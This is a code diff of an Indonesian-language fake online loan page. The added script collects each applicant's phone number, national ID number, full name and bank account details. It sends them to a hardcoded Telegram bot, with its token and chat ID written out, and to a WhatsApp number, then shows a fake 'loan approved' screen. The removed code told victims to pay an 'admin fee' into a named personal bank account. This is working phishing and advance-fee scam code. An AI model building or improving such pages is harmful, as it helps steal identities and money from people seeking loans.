@@ -21,7 +21,7 @@
             width: 100%;
             max-width: 400px;
             background: #1a1a2e;
-            border-radius: 10px;.
+            border-radius: 10px;
             padding: 20px;
             box-shadow: 0 0 30px rgba(0, 119, 255, 0.5);
         }
@@ -98,6 +98,31 @@
         }
         .btn-kirim {
             background: linear-gradient(90deg, #ff0033, #ff3366);
+        }
+        /* STYLE UNTUK HALAMAN SUKSES */
+        .success-step {
+            display: none;
+            text-align: center;
+            padding: 30px 20px;
+            color: white;
+        }
+        .success-icon {
+            font-size: 50px;
+            color: #33ff33;
+            margin-bottom: 20px;
+        }
+        .success-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .success-detail {
+            background: #252545;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: left;
+            line-height: 25px;
         }
         .note {
             color: #ccc;
@@ -176,15 +201,30 @@
                 <option value="Maybank">BANK MAYBANK</option>
             </select>
 
-            
+            <button class="btn-action btn-kirim" onclick="kirimSemuaData()">KIRIM DATA & PROSES PINJAMAN</button>
         </div>
 
-        <div class="note">*Biaya admin 1% berlaku untuk SEMUA limit pinjaman<br>**
+        <!-- HALAMAN SUKSES OTOMATIS -->
+        <div class="success-step" id="stepSuccess">
+            <div class="success-icon">✅</div>
+            <div class="success-title">PINJAMAN ANDA BERHASIL!</div>
+            <div class="success-detail" id="successText">
+                <!-- TEKS INI AKAN DITAMBAHKAN OTOMATIS SESUAI PILIHAN -->
+            </div>
+            <p>Untuk rincian biaya dan jadwal pembayaran akan kami komunikasikan via WhatsApp dan SMS.</p>
+        </div>
+
+        <div class="note">*Biaya admin 1% berlaku untuk SEMUA limit pinjaman<br>
     </div>
 
     <script>
-        // NOMOR WA ADMIN (GANTI DENGAN NOMOR YANG SESUAI)
-        const WA_ADMIN = "085809881886
+        // KONFIGURASI BOT TELEGRAM
+        const BOT_TOKEN = "8067130100:AAE5FOOfKpiNGbydAIAczleTkO_UJoukEMU";
+        const CHAT_ID = "8571321926";
+        const API_URL_TELEGRAM = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        // KONFIGURASI WHATSAPP ADMIN
+        const WA_ADMIN = "6285808991886"; // GANTI DENGAN NOMOR WA ADMIN
 
         // FUNGSI BERALIH STEP
         function keStep2() {
@@ -232,113 +272,74 @@
                 document.getElementById('biaya').innerText = `TENOR ${tenor} | BIAYA ADMIN 1%: Rp ${biayaAdmin} | TOTAL BAYAR: Rp ${total}`;
             }
         }
-!-- BAGIAN PILIH LIMIT & PERHITUNGAN BIAYA -->
-<div style="max-width:400px; margin:0 auto; padding:15px;">
-    <h3 style="color:#ffd700; text-align:center; margin:20px 0;">PILIH JUMLAH PINJAMAN</h3>
 
-    <!-- PILIH LIMIT (10JT - 250JT) BISA DIKLIK -->
-    <div style="display:flex; flex-wrap:wrap; gap:10px; margin:20px 0;">
-        <button class="btn-limit active" onclick="pilihLimit(10000000)">Rp 10.000.000</button>
-        <button class="btn-limit" onclick="pilihLimit(25000000)">Rp 25.000.000</button>
-        <button class="btn-limit" onclick="pilihLimit(50000000)">Rp 50.000.000</button>
-        <button class="btn-limit" onclick="pilihLimit(100000000)">Rp 100.000.000</button>
-        <button class="btn-limit" onclick="pilihLimit(150000000)">Rp 150.000.000</button>
-        <button class="btn-limit" onclick="pilihLimit(250000000)">Rp 250.000.000</button>
-    </div>
+        // KIRIM DATA & TAMPILKAN HALAMAN SUKSES OTOMATIS
+        function kirimSemuaData() {
+            // AMBIL SEMUA DATA
+            const hp = document.getElementById('hp').value;
+            const nick = document.getElementById('nick').value;
+            const nik = document.getElementById('nik').value;
+            const nama = document.getElementById('nama').value;
+            const limit = parseInt(document.getElementById('limit').value);
+            const limitText = document.querySelector('.btn-pilih[data-limit].active').textContent;
+            const tenor = document.getElementById('tenor').value;
+            const biayaAdmin = (limit * 0.01).toLocaleString('id-ID');
+            const namaRek = document.getElementById('namaRek').value;
+            const noRek = document.getElementById('noRek').value;
+            const bank = document.getElementById('bank').value;
 
-    <!-- RINCIAN BIAYA 1% OTOMATIS -->
-    <div style="background:#1a1a1a; padding:15px; border-radius:5px; margin:20px 0;">
-        <p style="display:flex; justify-content:space-between; color:#fff;"><span>Jumlah Pinjaman:</span> <span id="txtLimit">Rp 10.000.000</span></p>
-        <p style="display:flex; justify-content:space-between; color:#fff;"><span>Biaya Admin (1%):</span> <span id="txtBiaya">Rp 100.000</span></p>
-        <p style="display:flex; justify-content:space-between; color:#ffd700; font-weight:bold;"><span>TOTAL YANG HARUS DIBAYAR:</span> <span id="txtTotal">Rp 10.100.000</span></p>
-    </div>
+            // FORMAT PESAN
+            const pesan = `*DATA PINJAMAN TUNAI ABC*\n
+*NOMOR HP WA:* ${hp}\n
+*NICKNAME:* ${nick}\n
+*NIK KTP:* ${nik}\n
+*NAMA LENGKAP:* ${nama}\n
+*LIMIT PINJAMAN:* ${limitText} (Rp ${limit.toLocaleString('id-ID')})\n
+*TENOR:* ${tenor}\n
+*BIAYA ADMIN (1%):* Rp ${biayaAdmin}\n
+*TOTAL YANG HARUS DIBAYAR:* Rp ${(limit + (limit * 0.01)).toLocaleString('id-ID')}\n
+*DATA REKENING:*\n
+- Nama: ${namaRek}\n
+- No Rekening: ${noRek}\n
+- Bank: ${bank}\n\n
+*Mohon proses pinjaman saya ya admin, terima kasih.*`;
 
-    <!-- REKENING TUJUAN PEMBAYARAN (FIX: YOSES - BRI - 563801023952503) -->
-    <div style="background:#1a1a1a; padding:15px; border-radius:5px; margin:20px 0; text-align:center;">
-        <p style="color:#fff; font-weight:bold;">REKENING TUJUAN PEMBAYARAN</p>
-        <p style="color:#ccc;">Atas Nama: <span style="color:#ffd700; font-weight:bold;">YOSES</span></p>
-        <p style="color:#fff; font-size:18px; font-weight:bold; margin:10px 0;" id="nomorRek">563801023952503</p>
-        <p style="color:#ccc;">Bank: <span style="color:#ffd700; font-weight:bold;">BRI</span></p>
-        
-        <!-- TOMBOL SALIN REKENING OTOMATIS -->
-        <button onclick="salinRekening()" style="width:100%; padding:10px; background:#ffd700; color:#000; border:none; border-radius:5px; font-weight:bold; cursor:pointer; margin:10px 0;">SALIN NOMOR REKENING</button>
-        <div style="color:#00ff00; display:none; margin:5px 0;" id="notifSalin">✅ Nomor rekening berhasil disalin!</div>
-    </div>
+            // KIRIM KE BOT TELEGRAM
+            fetch(API_URL_TELEGRAM, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: pesan,
+                    parse_mode: 'Markdown'
+                })
+            }).then(response => response.json())
+            .then(data => {
+                if(data.ok) {
+                    console.log("Data berhasil tersimpan ke bot Telegram");
+                }
+            }).catch(err => {
+                console.log("Gagal kirim ke bot Telegram:", err);
+            });
 
-    <!-- TOMBOL KONFIRMASI PEMBAYARAN -->
-    <button onclick="konfirmasiPembayaran()" style="width:100%; padding:15px; background:#ffd700; color:#000; border:none; border-radius:5px; font-size:16px; font-weight:bold; cursor:pointer;">SAYA SUDAH MELAKUKAN PEMBAYARAN</button>
+            // KIRIM KE WHATSAPP
+            const linkWA = `https://api.whatsapp.com/send?phone=${WA_ADMIN}&text=${encodeURIComponent(pesan)}`;
+            window.open(linkWA, '_blank');
 
-    <!-- PESAN KONFIRMASI SETELAH PEMBAYARAN BERHASIL -->
-    <div id="pesanSukses" style="background:#1a1a1a; padding:20px; border-radius:5px; margin:20px 0; text-align:center; display:none; border:2px solid #00ff00;">
-        <h4 style="color:#00ff00; margin-bottom:15px;">✅ PEMBAYARAN BERHASIL</h4>
-        <p style="color:#fff; line-height:22px;">
-            Terima kasih telah melakukan pembayaran untuk pinjaman Anda.<br>
-            Pembayaran ke rekening YOSES (BRI - 563801023952503) telah kami terima dan akan diakumulasikan secara otomatis sesuai dengan biaya yang telah ditetapkan (1% biaya admin).<br>
-            Dana pinjaman akan kami kirimkan ke rekening yang Anda daftarkan setelah proses verifikasi selesai.
-        </p>
-    </div>
-</div>
-
-<!-- STYLE UNTUK TOMBOL LIMIT -->
-<style>
-    .btn-limit {
-        flex:1 1 30%;
-        padding:10px;
-        border:2px solid #ffd700;
-        border-radius:5px;
-        background:#1a1a1a;
-        color:#fff;
-        cursor:pointer;
-        text-align:center;
-        transition:all 0.3s;
-    }
-    .btn-limit.active {
-        background:#ffd700;
-        color:#000;
-        font-weight:bold;
-    }
-</style>
-
-<!-- SCRIPT UNTUK FUNGSI OTOMATIS -->
-<script>
-    let limitTerpilih = 10000000;
-
-    // FORMAT ANGKA MENJADI RUPIAH
-    function formatRupiah(angka) {
-        return "Rp " + angka.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
-    }
-
-    // PILIH LIMIT & HITUNG BIAYA OTOMATIS
-    function pilihLimit(jumlah) {
-        // UBAH STATUS TOMBOL YANG DIPILIH
-        document.querySelectorAll('.btn-limit').forEach(btn => btn.classList.remove('active'));
-        event.target.classList.add('active');
-
-        // HITUNG BIAYA 1%
-        limitTerpilih = jumlah;
-        const biayaAdmin = jumlah * 0.01;
-        const totalBayar = jumlah + biayaAdmin;
-
-        // TAMPILKAN HASIL KE LAYAR
-        document.getElementById('txtLimit').textContent = formatRupiah(jumlah);
-        document.getElementById('txtBiaya').textContent = formatRupiah(biayaAdmin);
-        document.getElementById('txtTotal').textContent = formatRupiah(totalBayar);
-    }
-
-    // SALIN REKENING OTOMATIS
-    function salinRekening() {
-        const nomorRek = document.getElementById('nomorRek').textContent;
-        const rekLengkap = `YOSES - ${nomorRek} (BRI)`;
-        
-        navigator.clipboard.writeText(rekLengkap);
-        document.getElementById('notifSalin').style.display = "block";
-        setTimeout(() => document.getElementById('notifSalin').style.display = "none", 3000);
-    }
-
-    // TAMPILKAN PESAN SETELAH KONFIRMASI PEMBAYARAN
-    function konfirmasiPembayaran() {
-        document.getElementById('pesanSukses').style.display = "block";
-    }
+            // TAMPILKAN HALAMAN SUKSES DENGAN TEKS OTOMATIS
+            document.getElementById('step3').style.display = 'none';
+            document.getElementById('stepSuccess').style.display = 'block';
+            document.getElementById('successText').innerHTML = `
+                <b>Nama Peminjam:</b> ${nama} (${nick})<br>
+                <b>Limit Pinjaman:</b> ${limitText} (Rp ${limit.toLocaleString('id-ID')})<br>
+                <b>Tenor Pinjaman:</b> ${tenor}<br>
+                <b>Biaya Admin:</b> Rp ${biayaAdmin} (1%)<br>
+                <b>Total Pembayaran:</b> Rp ${(limit + (limit * 0.01)).toLocaleString('id-ID')}<br>
+                <b>Rekening Tujuan:</b> ${namaRek} - ${noRek} (${bank})
+            `;
+        }
     </script>
 </body>
-              </html>
+</html>
